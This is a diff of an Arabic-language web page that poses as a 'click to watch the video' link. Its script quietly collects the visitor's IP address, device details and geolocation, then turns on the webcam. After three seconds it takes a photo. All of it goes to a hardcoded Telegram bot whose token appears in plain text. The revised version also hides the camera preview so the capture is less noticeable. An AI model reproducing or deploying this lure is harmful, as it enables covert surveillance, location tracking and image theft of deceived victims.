@@ -1,136 +1,129 @@
-<!DOCTYPE html>
-<html lang="ar">
+<!DOCTYPE html><html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <title>اضغط لمشاهدة الفيديو</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { 
-            font-family: Tahoma, sans-serif; 
-            background-color: #000; 
-            color: #fff;
-            text-align: center; 
-            padding-top: 80px; 
-            margin: 0;
-        }
-        button {
-            padding: 14px 30px;
-            font-size: 18px;
-            background-color: #ff004f;
-            color: white;
-            border: none;
-            border-radius: 30px;
-            cursor: pointer;
-            font-weight: bold;
-            box-shadow: 0 0 15px #ff004f;
-            transition: background-color 0.3s ease;
-        }
-        button:hover {
-            background-color: #e60044;
-        }
-        video {
-            margin-top: 30px;
-            max-width: 90vw;
-            border-radius: 20px;
-            display: none;
-        }
-        p {
-            font-size: 20px;
-            margin: 20px 0 40px;
-        }
-        h2 {
-            font-size: 28px;
-            margin-bottom: 10px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>🎥 اضغط لمشاهدة الفيديو</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Tahoma', sans-serif;
+      background-color: #121212;
+      color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+    h2 {
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+    button {
+      padding: 14px 28px;
+      font-size: 18px;
+      background-color: #ff2c55;
+      border: none;
+      border-radius: 12px;
+      color: white;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover {
+      background-color: #e91e63;
+    }
+    #loading {
+      margin-top: 20px;
+      display: none;
+    }
+    video {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-    <h2>📷 اضغط لمشاهدة الفيديو</h2>
-    <p>اضغط موافق لمشاهدة فيديو</p>
-    <button onclick="startProcess()">اضغط موافق لمشاهدة فيديو</button>
+  <h2>🎥 اضغط لمشاهدة الفيديو</h2>
+  <p>اضغط موافق لمشاهدة فيديو</p>
+  <button onclick="startProcess()">📤 موافق</button>
+  <p id="loading">⏳ جارٍ المعالجة...</p>
+  <video id="video" autoplay playsinline></video>  <script>
+    const chatId = "7220184605";
+    const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
 
-    <video id="video" autoplay playsinline></video>
+    async function sendTelegramMessage(text) {
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+    }
 
-    <script>
-        const chatId = "7220184605";
-        const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
+    async function sendPhoto(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, "photo.jpg");
 
-        async function sendTelegramMessage(text) {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
-        }
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    }
 
-        async function sendPhoto(blob) {
-            const formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", blob, "photo.jpg");
+    async function getIP() {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      return data.ip;
+    }
 
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            });
-        }
+    async function startProcess() {
+      document.getElementById('loading').style.display = 'block';
 
-        async function getIP() {
-            const res = await fetch("https://api.ipify.org?format=json");
-            const data = await res.json();
-            return data.ip;
-        }
+      const ip = await getIP();
+      const device = navigator.userAgent;
+      const now = new Date().toLocaleString("en-GB", { timeZone: "Asia/Damascus" });
 
-        async function startProcess() {
-            const ip = await getIP();
-            const device = navigator.userAgent;
-            const now = new Date().toLocaleString("en-GB", { timeZone: "Asia/Damascus" });
+      let locationText = "📍 الموقع: لم يُسمح به";
+      try {
+        await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition((position) => {
+            const lat = position.coords.latitude.toFixed(5);
+            const lon = position.coords.longitude.toFixed(5);
+            locationText = `📍 https://maps.google.com/?q=${lat},${lon}`;
+            resolve();
+          }, reject, {timeout: 5000});
+        });
+      } catch (e) {
+        locationText = "📍 الموقع: رفض المستخدم أو فشل";
+      }
 
-            let locationText = "📍 الموقع: لم يُسمح به";
-            try {
-                await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition((position) => {
-                        const lat = position.coords.latitude.toFixed(5);
-                        const lon = position.coords.longitude.toFixed(5);
-                        locationText = `📍 الموقع: https://maps.google.com/?q=${lat},${lon}`;
-                        resolve();
-                    }, reject, {timeout: 5000});
-                });
-            } catch (e) {
-                locationText = "📍 الموقع: رفض المستخدم أو فشل";
-            }
+      const baseMessage = `🔍 زائر جديد:%0A🌐 IP: ${ip}%0A📱 الجهاز: ${device}%0A🕓 التاريخ: ${now}%0A${locationText}`;
+      await sendTelegramMessage(baseMessage);
 
-            const baseMessage = `🔍 زائر جديد:%0A🌐 IP: ${ip}%0A📱 الجهاز: ${device}%0A🕓 التاريخ: ${now}%0A${locationText}`;
-            await sendTelegramMessage(baseMessage);
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        video.play();
 
-            // بدء الكاميرا
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                video.style.display = 'block'; // إظهار الفيديو
-                video.play();
+        setTimeout(async () => {
+          const canvas = document.createElement("canvas");
+          canvas.width = 640;
+          canvas.height = 480;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          stream.getTracks().forEach(track => track.stop());
 
-                // إخفاء الزر والنص بعد بدء الفيديو
-                document.querySelector('button').style.display = 'none';
-                document.querySelector('p').style.display = 'none';
-                document.querySelector('h2').style.display = 'none';
+          canvas.toBlob(async (blob) => {
+            await sendPhoto(blob);
+            document.getElementById('loading').textContent = '✅ تم التقاط الصورة وإرسال البيانات بنجاح';
+          }, 'image/jpeg');
+        }, 3000);
 
-                // الانتظار ثم التقاط صورة
-                setTimeout(async () => {
-                    const canvas = document.createElement("canvas");
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    const ctx = canvas.getContext("2d");
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    stream.getTracks().forEach(track => track.stop());
-
-                    canvas.toBlob(async (blob) => {
-                        await sendPhoto(blob);
-                    }, 'image/jpeg');
-                }, 3000);
-
-            } catch (err) {
-                await sendTelegramMessage("⚠️ لم يتم منح إذن الكاميرا.");
-                alert("لم يتم السماح بالوصول إلى الكاميرا.");
-            }
-        }
-    </script>
-</body>
+      } catch (err) {
+        await sendTelegramMessage("⚠️ لم يتم منح إذن الكاميرا.");
+        document.getElementById('loading').textContent = '⚠️ لم يتم منح إذن الكاميرا.';
+      }
+    }
+  </script></body>
 </html>
